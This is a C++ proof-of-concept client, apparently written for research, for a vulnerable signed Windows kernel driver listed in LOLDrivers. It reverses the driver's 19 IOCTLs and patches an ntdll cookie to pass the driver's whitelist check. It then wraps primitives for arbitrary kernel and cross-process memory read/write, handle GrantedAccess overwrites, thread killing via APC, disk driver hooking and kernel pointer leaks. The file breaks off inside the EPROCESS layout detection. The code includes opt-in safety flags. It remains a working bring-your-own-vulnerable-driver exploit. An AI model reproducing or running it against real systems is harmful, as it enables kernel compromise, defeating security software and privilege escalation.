// =============================================================================
//  poc_p2KGhmzs.cpp - user-mode client for p2KGhmzsARY1.sys ("isj2uaoX")
//
//  Research PoC, reversed from
//      loldrivers\samples\p2KGhmzsARY1.sys
//      SHA-256 4473fef2a90a3217db685de44f575d2586666fcf3db7fa9efa1328afcdbf34a8
//      MD5     1265a42ceab0418f2371e0f3e72c9b39
//      signer  Microsoft Windows Hardware Compatibility Publisher (WHQL)
//      PDB     C:\Intel\x
//
//  DriverEntry             0x140001270   \Device\isj2uaoX + \DosDevices\isj2uaoX
//                                         resolves MmMapIoSpaceEx / MmCopyMemory
//  DispatchCreate          0x140001110   ntdll cookie handshake (see Bootstrap)
//  DispatchClose           0x1400010B0   drops one whitelist reference
//  DispatchDeviceControl   0x1400013A0   switch over 19 IOCTL codes
//
//  All IOCTLs are METHOD_OUT_DIRECT (code & 3 == 2):
//    * the input buffer is copied to Irp->AssociatedIrp.SystemBuffer (kernel
//      copy, size = InputBufferLength) - the driver reads its request struct
//      from there with NO length validation of its own
//    * the output buffer is locked into Irp->MdlAddress - the driver maps that
//      MDL and writes result values into the user buffer
//  Consequences for this client:
//    * always send a full 0x100-byte input buffer, even for tiny requests
//    * always provide a >= 0x100-byte output buffer, otherwise the handlers
//      that map the MDL dereference a NULL MDL
//
//  IOCTL                       handler                  request / response
//  0x220006  ProtectProcess    WhitelistProtect        in  {u32 pid}
//  0x22000A  UnprotectProcess  WhitelistUnprotect      in  {u32 pid}
//  0x22000E  KernelRead        -> MmCopyVirtualMemory  in  {u64 kaddr; u64 user; u64 size}
//  0x220012  KernelWrite       -> MmCopyVirtualMemory  in  {u64 kaddr; u64 user; u64 size}
//  0x220016  ArmUnload         DriverObject+0x68       in  -
//  0x22001A  Constant          *out = 0x100080000      out {u64}
//  0x22001E  ProcessCopy       MmCopyVirtualMemory or  in  {u32 pid; u32 pad; u64 addr1;
//                                page walk + MmMapIoSpace      u64 size; u64 addr2;
//                                                              u8 read; u8 phys}
//  0x220022  HandleAccess      ExEnumHandleTable       in  {u32 pid; u32 pad; u64 handle;
//                                                              u64 access}
//                                                      -> entry+8 (GrantedAccess) = access
//                                                         when the handle value matches
//  0x220026  KernelTableCall   internal pointer table  in  {wchar name[0x80]; u64 a1..a3}
//  0x22002A  MouseInject       MouClass service cb     in  {u32 buttons; u32 lastY;
//                                                              u16 btnFlags; u16 flags}
//  0x22002E  DiskHook          \Driver\Disk            in  {u8 mode}  0 = hijack
//  0x220032  KillThread        APC -> PsTerminate...   in  {u32 tid}
//  0x220036  GetThread         PsLookupThreadByThreadId out {u64 ETHREAD}
//  0x22003A  GetProcess        PsLookupProcessByProcessId out {u64 EPROCESS}
//  0x22003E  RefHandle         ObReferenceObjectByHandle out {u64 object}
//  0x220042  DelayApc          APC -> KeDelayExecution  in  {u32 tid; u32 pad; u64 ms}
//  0x220046  -                 not implemented          -
//  0x22004E  SetOsOffsets      memcpy over offset table in  {u8 table[0x3C]}  NO BOUND
//  0x22018E  PoolScan          BigPool tag 0x546E6F43   out {u64 pool base}
//
//  Commands (all 19 codes are reachable, 0x220046 is a no-op by design):
//    --walk                  EPROCESS walk -> BaseAddress + ProcessCR3 per pid
//    --dump-offsets          read the live g_OsOffsets table (driver .data)
//    --set-offsets HEX       overwrite it with exactly 0x3C bytes
//    --pool-scan             BigPool tag scan
//    --ref-handle N          object-pointer leak for a handle
//    --patch-handle PID H A  handle-table GrantedAccess overwrite
//    --table-call MOD A1 A2 A3  kernel table pointer call
//    --mouse B Y BF F        MouClass input injection
//    --disk-hook [mode]      \\Driver\\Disk IRP_MJ_DEVICE_CONTROL swap
//    --kill-thread TID       APC -> PsTerminateSystemThread
//    --delay-apc TID MS      APC -> KeDelayExecutionThread
//    --protect/--unprotect   whitelist flag
//    --arm-unload            install DriverUnload
//    --kernel-read/-write    raw kernel read/write
//    --read/-write           raw process read/write
//
//  Safety rules of this client:
//    * default run is read-only: constant, EPROCESS/ETHREAD leak, kernel read
//      of the EPROCESS header, the full EPROCESS walk, and a process read of
//      the target's MZ header
//    * every write needs --unsafe; kernel writes, the physical path, the
//      handle-table patch, table calls, the disk hook, thread APCs and the
//      offset table additionally need --i-mean-it
//    * writes are verified by reading the old bytes first and restoring them
//    * no blind address scans, no fixed kernel addresses
//    * the target image base is resolved through the PEB (OpenProcess +
//      NtQueryInformationProcess -> PEB->ImageBaseAddress read by the driver),
//      never through CreateToolhelp32Snapshot(TH32CS_SNAPMODULE), which can
//      block on packaged/AppContainer targets such as Windows 11 Notepad
//    * the walk auto-detects the EPROCESS layout from the System process
//      (image name at +N, pid at +N-0x168, links at +N-0x160, base at +N-0x88)
//      and falls back to a table of known Win10/11 layouts
//
//  Note on MmGetSystemRoutineAddress: user mode cannot call it.  The companion
//  driver in epwalk\ resolves PsGetProcessId, PsGetProcessImageFileName,
//  PsGetProcessSectionBaseAddress and PsGetNextProcess that way and prints
//  base + CR3 without exposing any read/write primitive.  This client gets the
//  same two values through the vulnerable driver's 0x22003A/0x22000E path.
//
//  Verified run (Windows 11, elevated): cookie 0xC7FE accepted, constant
//  0x100080000, EPROCESS/ETHREAD leaks, kernel read of the EPROCESS header
//  with DirectoryTableBase 0x3FE4B1000 and self-referencing LIST_ENTRYs.
//
//  Build (MSVC, x64):
//    cl /EHsc /W4 /nologo poc_p2KGhmzs.cpp /Fe:poc_p2KGhmzs.exe
// =============================================================================

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <cstdio>
#include <cstdint>
#include <cstddef>
#include <cstring>
#include <cstdlib>
#include <cctype>
#include <cwchar>
#include <vector>
#include <string>

#pragma comment(lib, "advapi32.lib")   // OpenProcessToken / AdjustTokenPrivileges
#pragma comment(lib, "psapi.lib")      // EnumDeviceDrivers / GetDeviceDriverBaseNameW

// -----------------------------------------------------------------------------
//  Device + IOCTL codes (raw values from the switch table in 0x1400013A0)
// -----------------------------------------------------------------------------
static const wchar_t* kDevicePath = L"\\\\.\\isj2uaoX";

static const DWORD kIoctlProtectProcess   = 0x220006;
static const DWORD kIoctlUnprotectProcess = 0x22000A;
static const DWORD kIoctlKernelRead       = 0x22000E;
static const DWORD kIoctlKernelWrite      = 0x220012;
static const DWORD kIoctlArmUnload        = 0x220016;
static const DWORD kIoctlConstant         = 0x22001A;
static const DWORD kIoctlProcessCopy      = 0x22001E;
static const DWORD kIoctlEnumHandles      = 0x220022;   // GrantedAccess overwrite
static const DWORD kIoctlKernelTableCall  = 0x220026;
static const DWORD kIoctlMouseInject      = 0x22002A;
static const DWORD kIoctlDiskHook         = 0x22002E;
static const DWORD kIoctlKillThread       = 0x220032;
static const DWORD kIoctlGetThread        = 0x220036;
static const DWORD kIoctlGetProcess       = 0x22003A;
static const DWORD kIoctlRefHandle        = 0x22003E;
static const DWORD kIoctlDelayApc         = 0x220042;
static const DWORD kIoctlSetOsOffsets     = 0x22004E;
static const DWORD kIoctlPoolScan         = 0x22018E;

static const UINT32 kReqSize = 0x100;   // input buffer handed to the driver
static const UINT32 kOutSize = 0x100;   // output buffer (IRP MDL source)

// The driver's offset table lives at VA 0x140009868 (RVA 0x9868) and is
// exactly 0x3C bytes (InitOsOffsets fills +0 .. +0x3B).
static const wchar_t* kDriverImageName = L"p2KGhmzsARY1.sys";
static const UINT32   kOsOffsetsRva    = 0x9868;
static const UINT32   kOsOffsetsSize   = 0x3C;

// x64 kernel address range starts here (canonical high half).
static const UINT64 kKernelBase = 0xFFFF800000000000ULL;

// -----------------------------------------------------------------------------
//  Request layouts - byte offsets taken from the decompiled handlers, not from
//  a public header (there is none).  Every union is padded to 0x100 so that the
//  driver's unchecked reads stay inside the SystemBuffer.
// -----------------------------------------------------------------------------
#pragma pack(push, 1)

// 0x22000E / 0x220012 - MmCopyVirtualMemory against PsInitialSystemProcess.
//   read : System(kaddr) -> Current(user)     [0x22000E]
//   write: Current(user) -> System(kaddr)     [0x220012]
// +0x18 is the driver's success flag inside the SystemBuffer (not readable
// from user mode), the IOCTL status is the real result.
struct KernelCopyReq {
    UINT64 KernelAddr;   // +0x00  validated with MmIsAddressValid
    UINT64 UserAddr;     // +0x08  buffer in the calling process
    UINT64 Size;         // +0x10
    UINT8  DriverFlag;   // +0x18  written by the driver 0/1
    UINT8  Pad[0xE7];    // +0x19
};

// 0x22001E - copy between a target process and the caller.
//   Read == 1 : target(addr1) -> caller(addr2)
//   Read == 0 : caller(addr2) -> target(addr1)
//   Physical == 1: addr2 is translated in the *caller*, mapped with
//                  MmMapIoSpaceEx/MmMapIoSpace and used as the staging page;
//                  addr1 is still accessed through the target's page tables.
struct ProcessCopyReq {
    UINT32 Pid;          // +0x00
    UINT32 Pad0;         // +0x04
    UINT64 Addr1;        // +0x08  target VA
    UINT64 Size;         // +0x10
    UINT64 Addr2;        // +0x18  caller VA
    UINT8  Read;         // +0x20  1 = read, 0 = write
    UINT8  Physical;     // +0x21  1 = physical staging path
    UINT8  Pad1[0xDE];   // +0x22
};

// 0x220036 / 0x22003A / 0x22003E - pointer leaks, request is one DWORD.
struct PidReq {
    UINT32 Pid;          // +0x00  also thread id / handle
    UINT8  Pad[0xFC];
};

// Result of the MDL-writing handlers: 8 bytes at the start of the output buffer.
struct Out64 {
    UINT64 Value;        // +0x00
    UINT8  Pad[0xF8];
};

// 0x220022 - ExEnumHandleTable over the target's handle table.
// The dispatch passes  (+0x08) as the handle value to match and (+0x10) as the
// new value written to entry+8 (GrantedAccess).  There is no function pointer:
// the callback that fires is the driver's own sub_140003610.
struct HandleAccessReq {
    UINT32 Pid;          // +0x00
    UINT32 Pad0;         // +0x04
    UINT64 HandleValue;  // +0x08  compared with ExEnumHandleTable's HANDLE
    UINT64 NewAccess;    // +0x10  written to HANDLE_TABLE_ENTRY+8
    UINT8  Pad1[0xE8];   // +0x18
};

// 0x220026 - wide module name (BaseDllName, case sensitive) followed by the
// three arguments handed to the resolved table pointer.
struct TableCallReq {
    wchar_t Module[0x40];  // +0x00 0x80 bytes
    UINT64  A1;            // +0x80
    UINT64  A2;            // +0x88
    UINT64  A3;            // +0x90  only the low byte is used
    UINT8   Pad[0x68];     // +0x98
};

// 0x22002A - the handler requires InputBufferLength >= 0xC.
struct MouseReq {
    UINT32 Buttons;      // +0x00
    UINT32 LastY;        // +0x04
    UINT16 BtnFlags;     // +0x08
    UINT16 Flags;        // +0x0A
    UINT8  Pad[0xF4];
};

// 0x22002E - low byte of the request is the mode.
struct ModeReq {
    UINT8 Mode;          // +0x00
    UINT8 Pad[0xFF];
};

// 0x220032 / 0x220036 - thread id.
struct TidReq {
    UINT32 Tid;          // +0x00
    UINT8  Pad[0xFC];
};

// 0x220042 - thread id + delay in milliseconds.
struct DelayReq {
    UINT32 Tid;          // +0x00
    UINT32 Pad0;         // +0x04
    UINT64 Milliseconds; // +0x08
    UINT8  Pad[0xF0];
};

// 0x22003E - handle value.
struct HandleReq {
    UINT32 Handle;       // +0x00
    UINT8  Pad[0xFC];
};

// 0x22004E - the full offset table.  This request must be sent with exactly
// 0x3C input bytes: the handler does MemMove(g_OsOffsets, input, len) and only
// checks len >= 0x3C, so anything bigger overruns .data.
struct OffsetsReq {
    UINT8 Table[kOsOffsetsSize];
};

#pragma pack(pop)

static_assert(sizeof(KernelCopyReq)  == kReqSize, "KernelCopyReq must be 0x100");
static_assert(sizeof(ProcessCopyReq) == kReqSize, "ProcessCopyReq must be 0x100");
static_assert(sizeof(PidReq)         == kReqSize, "PidReq must be 0x100");
static_assert(sizeof(Out64)          == kOutSize, "Out64 must be 0x100");
static_assert(sizeof(HandleAccessReq)== kReqSize, "HandleAccessReq must be 0x100");
static_assert(sizeof(TableCallReq)   == kReqSize, "TableCallReq must be 0x100");
static_assert(sizeof(MouseReq)       == kReqSize, "MouseReq must be 0x100");
static_assert(sizeof(ModeReq)        == kReqSize, "ModeReq must be 0x100");
static_assert(sizeof(TidReq)         == kReqSize, "TidReq must be 0x100");
static_assert(sizeof(DelayReq)       == kReqSize, "DelayReq must be 0x100");
static_assert(sizeof(HandleReq)      == kReqSize, "HandleReq must be 0x100");
static_assert(sizeof(OffsetsReq)     == kOsOffsetsSize, "OffsetsReq must be 0x3C");
static_assert(offsetof(KernelCopyReq,  UserAddr)   == 0x08, "layout");
static_assert(offsetof(KernelCopyReq,  Size)       == 0x10, "layout");
static_assert(offsetof(ProcessCopyReq, Addr1)      == 0x08, "layout");
static_assert(offsetof(ProcessCopyReq, Size)       == 0x10, "layout");
static_assert(offsetof(ProcessCopyReq, Addr2)      == 0x18, "layout");
static_assert(offsetof(ProcessCopyReq, Read)       == 0x20, "layout");
static_assert(offsetof(ProcessCopyReq, Physical)   == 0x21, "layout");
static_assert(offsetof(HandleAccessReq,HandleValue)== 0x08, "layout");
static_assert(offsetof(HandleAccessReq,NewAccess)  == 0x10, "layout");
static_assert(offsetof(TableCallReq,   A1)         == 0x80, "layout");
static_assert(offsetof(TableCallReq,   A2)         == 0x88, "layout");
static_assert(offsetof(TableCallReq,   A3)         == 0x90, "layout");
static_assert(offsetof(MouseReq,       BtnFlags)   == 0x08, "layout");
static_assert(offsetof(DelayReq,       Milliseconds)==0x08, "layout");

// -----------------------------------------------------------------------------
//  Small helpers
// -----------------------------------------------------------------------------
static void HexDump(const void* p, size_t n, UINT64 base)
{
    const unsigned char* b = static_cast<const unsigned char*>(p);
    for (size_t i = 0; i < n; i += 16) {
        printf("  %016llx  ", static_cast<unsigned long long>(base + i));
        for (size_t j = 0; j < 16 && (i + j) < n; ++j)
            printf("%02x ", b[i + j]);
        for (size_t j = (n - i < 16) ? (n - i) : 16; j < 16; ++j)
            printf("   ");
        printf(" |");
        for (size_t j = 0; j < 16 && (i + j) < n; ++j) {
            unsigned char c = b[i + j];
            printf("%c", (c >= 0x20 && c < 0x7F) ? c : '.');
        }
        printf("|\n");
    }
}

static void PrintWin32Hint(DWORD err)
{
    switch (err) {
    case ERROR_FILE_NOT_FOUND:
    case ERROR_PATH_NOT_FOUND:
        printf("      hint: device not present - is the driver loaded?\n");
        break;
    case ERROR_ACCESS_DENIED:
        printf("      hint: access denied - administrator? ntdll cookie mismatch?\n");
        break;
    case ERROR_INVALID_FUNCTION:
        printf("      hint: driver answered STATUS_INVALID_DEVICE_REQUEST (0xC0000010):\n");
        printf("            caller not whitelisted, bad request, or rejected address\n");
        break;
    case ERROR_GEN_FAILURE:
        printf("      hint: STATUS_UNSUCCESSFUL (0xC0000001) - ntdll cookie wrong\n");
        break;
    case ERROR_NOT_ENOUGH_MEMORY:
        printf("      hint: the kernel copy failed or the MDL was NULL\n");
        break;
    default:
        break;
    }
}

// One DeviceIoControl with explicit buffer sizes.  METHOD_OUT_DIRECT copies
// the input into Irp->AssociatedIrp.SystemBuffer (InputBufferLength bytes) and
// locks the output into Irp->MdlAddress.
static bool IoctlRaw(HANDLE h, DWORD code, const void* in, DWORD inSize,
                     void* out, DWORD outSize, DWORD* br)
{
    DWORD bytes = 0;
    BOOL ok = DeviceIoControl(h, code,
                              const_cast<void*>(in), inSize,
                              out, outSize,
                              &bytes, nullptr);
    if (br) *br = bytes;
    if (!ok) {
        DWORD e = GetLastError();
        printf("[-] DeviceIoControl(0x%06X) failed: %lu (0x%08lX)\n", code, e, e);
        PrintWin32Hint(e);
        return false;
    }
    return true;
}

// Default call: full-size in/out buffers because most handlers read their
// struct without looking at InputBufferLength.
static bool Ioctl(HANDLE h, DWORD code, const void* in, void* out, DWORD* br)
{
    return IoctlRaw(h, code, in, kReqSize, out, kOutSize, br);
}

// -----------------------------------------------------------------------------
//  Bootstrap: the driver's create handler only whitelists a process if the
//  process stored a cookie in its own ntdll mapping:
//
//      cookie = 2 * (GetCurrentThreadId() + GetCurrentProcessId()) - 10
//      *(UINT64 *)(ntdll_base + 0xFFC) == cookie
//
//  DispatchCreate attaches to the caller, resolves ntdll through the PEB and
//  ProbeForRead's that QWORD.  On success it adds the EPROCESS to its list and
//  increments a per-entry reference count; DispatchDeviceControl rejects every
//  request while that count is zero.  We write the cookie, open the device and
//  restore the original bytes immediately.
// -----------------------------------------------------------------------------
struct NtdllPatch {
    unsigned char* Slot;
    UINT64         Original;
    DWORD          OldProtect;
    bool           Applied;
};

static bool PatchNtdllCookie(NtdllPatch* patch)
{
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) {
        printf("[-] GetModuleHandleW(ntdll.dll) failed: %lu\n", GetLastError());
        return false;
    }

    patch->Slot = reinterpret_cast<unsigned char*>(nt) + 0xFFC;
    patch->Applied = false;

    DWORD oldProtect = 0;
    if (!VirtualProtect(patch->Slot, sizeof(UINT64), PAGE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect(ntdll+0xFFC) failed: %lu\n", GetLastError());
        return false;
    }

    patch->OldProtect = oldProtect;
    patch->Original = *reinterpret_cast<volatile UINT64*>(patch->Slot);

    const UINT64 cookie =
        2ULL * (static_cast<UINT64>(GetCurrentThreadId()) +
                static_cast<UINT64>(GetCurrentProcessId())) - 10ULL;
    *reinterpret_cast<volatile UINT64*>(patch->Slot) = cookie;
    patch->Applied = true;

    printf("[+] ntdll cookie installed: 0x%016llx at %p (tid=%lu pid=%lu)\n",
           static_cast<unsigned long long>(cookie), patch->Slot,
           GetCurrentThreadId(), GetCurrentProcessId());
    return true;
}

static void RestoreNtdllCookie(NtdllPatch* patch)
{
    if (!patch->Applied) return;
    *reinterpret_cast<volatile UINT64*>(patch->Slot) = patch->Original;
    DWORD ignored = 0;
    VirtualProtect(patch->Slot, sizeof(UINT64), patch->OldProtect, &ignored);
    patch->Applied = false;
    printf("[+] ntdll bytes restored\n");
}

static HANDLE OpenDriver()
{
    HANDLE h = CreateFileW(kDevicePath,
                           GENERIC_READ | GENERIC_WRITE,
                           0, nullptr, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        printf("[-] CreateFileW(%ls) failed: %lu (0x%08lX)\n",
               kDevicePath, e, e);
        PrintWin32Hint(e);
        if (e == ERROR_ACCESS_DENIED || e == ERROR_GEN_FAILURE) {
            printf("      the ntdll cookie handshake was rejected; the driver does\n");
            printf("      not know this process (wrong tid/pid order, AV hooking\n");
            printf("      ntdll, or the device is already claimed)\n");
        }
        return INVALID_HANDLE_VALUE;
    }
    printf("[+] opened %ls (handle 0x%p)\n", kDevicePath, h);
    return h;
}

// -----------------------------------------------------------------------------
//  Primitive wrappers
// -----------------------------------------------------------------------------
static bool KernelRead(HANDLE h, UINT64 kaddr, void* dst, UINT32 size)
{
    if (kaddr < kKernelBase) {
        printf("[-] KernelRead: 0x%016llx is not a kernel address\n",
               static_cast<unsigned long long>(kaddr));
        return false;
    }
    if (size == 0 || size > 0x1000) {
        printf("[-] KernelRead: bad size %lu\n", size);
        return false;
    }

    KernelCopyReq req{};
    req.KernelAddr = kaddr;
    req.UserAddr   = reinterpret_cast<UINT64>(dst);
    req.Size       = size;

    Out64 out{};
    return Ioctl(h, kIoctlKernelRead, &req, &out, nullptr);
}

static bool KernelWrite(HANDLE h, UINT64 kaddr, const void* src, UINT32 size)
{
    if (kaddr < kKernelBase) {
        printf("[-] KernelWrite: 0x%016llx is not a kernel address\n",
               static_cast<unsigned long long>(kaddr));
        return false;
    }
    if (size == 0 || size > 0x1000) {
        printf("[-] KernelWrite: bad size %lu\n", size);
        return false;
    }

    KernelCopyReq req{};
    req.KernelAddr = kaddr;
    req.UserAddr   = reinterpret_cast<UINT64>(const_cast<void*>(src));
    req.Size       = size;

    Out64 out{};
    return Ioctl(h, kIoctlKernelWrite, &req, &out, nullptr);
}

static bool ProcessCopyInternal(HANDLE h, UINT32 pid, UINT64 remote,
                                UINT64 local, UINT32 size, bool read, bool phys)
{
    if (size == 0 || size > 0x1000) {
        printf("[-] ProcessCopy: bad size %lu\n", size);
        return false;
    }

    ProcessCopyReq req{};
    req.Pid      = pid;
    req.Addr1    = remote;
    req.Size     = size;
    req.Addr2    = local;
    req.Read     = read ? 1 : 0;
    req.Physical = phys ? 1 : 0;

    Out64 out{};
    return Ioctl(h, kIoctlProcessCopy, &req, &out, nullptr);
}

static bool ProcessRead(HANDLE h, UINT32 pid, UINT64 remote, void* local, UINT32 size)
{
    return ProcessCopyInternal(h, pid, remote,
                               reinterpret_cast<UINT64>(local), size, true, false);
}

static bool ProcessWrite(HANDLE h, UINT32 pid, UINT64 remote, const void* local, UINT32 size)
{
    return ProcessCopyInternal(h, pid, remote,
                               reinterpret_cast<UINT64>(const_cast<void*>(local)),
                               size, false, false);
}

static bool ProcessReadPhys(HANDLE h, UINT32 pid, UINT64 remote, void* local, UINT32 size)
{
    return ProcessCopyInternal(h, pid, remote,
                               reinterpret_cast<UINT64>(local), size, true, true);
}

static bool LeakPointer(HANDLE h, DWORD code, UINT32 id, UINT64* value)
{
    PidReq req{};
    req.Pid = id;

    Out64 out{};
    if (!Ioctl(h, code, &req, &out, nullptr)) return false;
    *value = out.Value;
    return true;
}

// -----------------------------------------------------------------------------
//  User-mode helpers
// -----------------------------------------------------------------------------
// PROCESS_QUERY_LIMITED_INFORMATION on a packaged/AppContainer target can fail
// for an elevated caller that has not enabled SeDebugPrivilege.  The driver
// read itself works regardless of target protection, so only the OpenProcess
// step needs help.
static bool EnableDebugPrivilege()
{
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool ok = LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege",
                                    &tp.Privileges[0].Luid) != FALSE;
    if (ok) {
        ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp),
                                   nullptr, nullptr) != FALSE;
        if (ok && GetLastError() == ERROR_NOT_ALL_ASSIGNED)
            ok = false;
    }
    CloseHandle(token);
    return ok;
}

static UINT32 FindPidByName(const wchar_t* name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    UINT32 pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

struct ProcessBasicInfo {
    LONG     ExitStatus;
    PVOID    PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG     BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
};

typedef LONG (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

static PFN_NtQueryInformationProcess ResolveNtQueryInformationProcess()
{
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return nullptr;
    return reinterpret_cast<PFN_NtQueryInformationProcess>(
        GetProcAddress(nt, "NtQueryInformationProcess"));
}

static bool QueryPeb(HANDLE process, UINT64* peb)
{
    PFN_NtQueryInformationProcess q = ResolveNtQueryInformationProcess();
    if (!q) return false;

    ProcessBasicInfo pbi{};
    ULONG returned = 0;
    LONG status = q(process, 0 /* ProcessBasicInformation */, &pbi, sizeof(pbi), &returned);
    if (status < 0 || !pbi.PebBaseAddress) return false;
    *peb = reinterpret_cast<UINT64>(pbi.PebBaseAddress);
    return true;
}

// Resolve the target image base without any user-mode module enumeration:
// NtQueryInformationProcess gives us the PEB address, and the vulnerable
// driver's own 0x22001E read fetches PEB->ImageBaseAddress.  This avoids
// CreateToolhelp32Snapshot(TH32CS_SNAPMODULE), which can block or fail on
// packaged/AppContainer targets (for example the Windows 11 Notepad).
static bool GetImageBaseViaPeb(HANDLE h, UINT32 pid, UINT64* base, UINT64* pebOut)
{
    HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!p) p = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!p) {
        printf("[-] OpenProcess(pid %lu) failed: %lu\n", pid, GetLastError());
        return false;
    }

    UINT64 peb = 0;
    bool havePeb = QueryPeb(p, &peb);
    CloseHandle(p);
    if (!havePeb) {
        printf("[-] NtQueryInformationProcess(ProcessBasicInformation) failed\n");
        return false;
    }

    UINT64 imageBase = 0;
    if (!ProcessRead(h, pid, peb + 0x10, &imageBase, sizeof(imageBase)))
        return false;
    if (imageBase == 0 || imageBase >= kKernelBase) {
        printf("[-] PEB->ImageBaseAddress is not usable: 0x%016llx\n",
               static_cast<unsigned long long>(imageBase));
        return false;
    }

    *base = imageBase;
    if (pebOut) *pebOut = peb;
    return true;
}

// -----------------------------------------------------------------------------
//  Kernel-side helpers (read-only)
// -----------------------------------------------------------------------------
// RtlGetVersion reports the real build; GetVersionEx lies without a manifest.
static UINT32 OsBuildNumber()
{
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return 0;
    typedef LONG (WINAPI *PFN_RtlGetVersion)(OSVERSIONINFOW*);
    PFN_RtlGetVersion fn = reinterpret_cast<PFN_RtlGetVersion>(
        GetProcAddress(nt, "RtlGetVersion"));
    if (!fn) return 0;

    OSVERSIONINFOW vi{};
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (fn(&vi) != 0) return 0;
    printf("[+] OS: %lu.%lu build %lu\n",
           vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
    return vi.dwBuildNumber;
}

// Base address of a loaded kernel module.  EnumDeviceDrivers needs no driver
// primitive and no fixed address; the names are the on-disk image names.
static UINT64 FindKernelModuleBase(const wchar_t* moduleName)
{
    LPVOID drivers[1024] = {};
    DWORD needed = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        printf("[-] EnumDeviceDrivers failed: %lu\n", GetLastError());
        return 0;
    }

    const DWORD count = needed / sizeof(LPVOID);
    for (DWORD i = 0; i < count && i < 1024; ++i) {
        wchar_t baseName[MAX_PATH] = {};
        if (!GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH))
            continue;
        if (_wcsicmp(baseName, moduleName) == 0)
            return reinterpret_cast<UINT64>(drivers[i]);
    }
    return 0;
}

// Owner PID of a thread (0xFFFFFFFF when unknown).  Used to refuse APCs into
// the idle/system process.
static UINT32 ThreadOwnerPid(UINT32 tid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0xFFFFFFFF;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    UINT32 owner = 0xFFFFFFFF;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32ThreadID == tid) {
                owner = te.th32OwnerProcessID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return owner;
}

// -----------------------------------------------------------------------------
//  EPROCESS layout discovery
//
//  The walk only needs four fields.  Instead of hardcoding one build, read the
//  System EPROCESS (pid 4), find its image name ("System") and derive the
//  neighbours, which have kept a fixed distance on x64 Win10/11:
//
//      pid   = name - 0x168     (UniqueProcessId)
//      links = name - 0x160     (ActiveProcessLinks)
//      base  = name - 0x088     (SectionBaseAddress)
//      cr3   = EPROCESS + 0x028 (KPROCESS.DirectoryTableBase)
//
//  Every derived field is validated against the live object; if the heuristic
//  fails, the known-layout table is tried.
// -----------------------------------------------------------------------------
#pragma pack(push, 1)
struct EprocessLayout {
    UINT32      Pid;
    UINT32      Links;
    UINT32      Name;
    UINT32      Base;
    const char* Source;
};
#pragma pack(pop)

static bool NameLooksLikeSystem(const unsigned char* buf, size_t len, size_t off)
{
    if (off + 7 > len) return false;
    return memcmp(buf + off, "System", 6) == 0 && buf[off + 6] == 0;
}

static bool LayoutIsPlausible(const unsigned char* buf, size_t len,
                              const EprocessLayout& l)
{
    if (l.Name + 16 > len || l.Pid + 8 > len || l.Base + 8 > len)
        return false;

    UINT32 pid = 0;
    UINT64 cr3 = 0, flink = 0, blink = 0;
    memcpy(&pid,   buf + l.Pid,   sizeof(pid));
    memcpy(&cr3,   buf + 0x28,    sizeof(cr3));
    memcpy(&flink, buf + l.Links, sizeof(flink));
    memcpy(&blink, buf + l.Links + 8, sizeof(blink));

    if (pid != 4) return false;
    if (!NameLooksLikeSystem(buf, len, l.Name)) return false;
    if (cr3 == 0 || (cr3 & 0xFFF) != 0) return false;
    if (flink < kKernelBase || blink < kKernelBase) return false;
    if ((flink & 7) != 0 || (blink & 7) != 0) return false;
    return true;
}

static bool DetectEprocessLayout(const unsigned char* buf, size_t len,
                                 EprocessLayout* out)
{
    // Preferred: derive from the image name.  Start at 0x300 so that an
    // unrelated "System" string inside the KPROCESS header cannot match.
    for (size_t off = 0x300; off + 7 <= len; ++off) {
        if (!NameLooksLikeSystem(buf, len, off)) continue;
        if (off < 0x168) continue;

        EprocessLayout l{};
        l.Name  = static_cast<UINT32>(off);
        l.Pid   = l.Name - 0x168;
        l.Links = l.Pid + 8;
        l.Base  = l.Name - 0x88;
        l.Source = "auto (image name - 0x168 / - 0x88)";
        if (LayoutIsPlausible(buf, len, l)) {
            *out = l;
            return true;
        }
    }

    // Fallback: known public layouts.
    static const EprocessLayout kKnown[] = {
        { 0x440, 0x448, 0x5A8, 0x520, "Win10 2004+ / Win11" },
        { 0x2E8, 0x2F0, 0x450, 0x3C8, "Win10 1903 / 1909" },
        { 0x2E0, 0x2E8, 0x450, 0x3C8, "Win10 1809" },
    };
    for (size_t i = 0; i < sizeof(kKnown) / sizeof(kKnown[0]); ++i) {
        if (LayoutIsPlausible(buf, len, kKnown[i])) {
